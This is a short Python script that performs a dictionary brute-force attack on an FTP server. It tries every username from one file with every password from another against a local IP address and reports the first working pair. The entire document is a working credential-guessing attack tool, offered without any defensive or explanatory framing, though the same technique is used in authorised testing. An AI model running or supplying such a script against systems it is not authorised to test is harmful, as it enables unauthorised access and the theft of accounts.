from ftplib import FTP
f = open("user.txt", "r")
l = f.readlines()
f.close()
f = open("pass.txt", "r")
x = f.readlines()
for i in x:
    i = i[:-2]
f.close()
for i in l:
    count = 0
    i = i[:-1]
    for j in x:
        j = j[:-1]
        print("Trying user %a" % i + " with password %a" % j)
        try:
            s = FTP("192.168.1.2")
            r = s.login(i, j)
            print("Found the Password")
            print("user = " + i)
            print("password = " + j)
            s.quit()
            count = 1
            break
        except Exception as e:
            print("incorrect")
    if count == 1:
        break
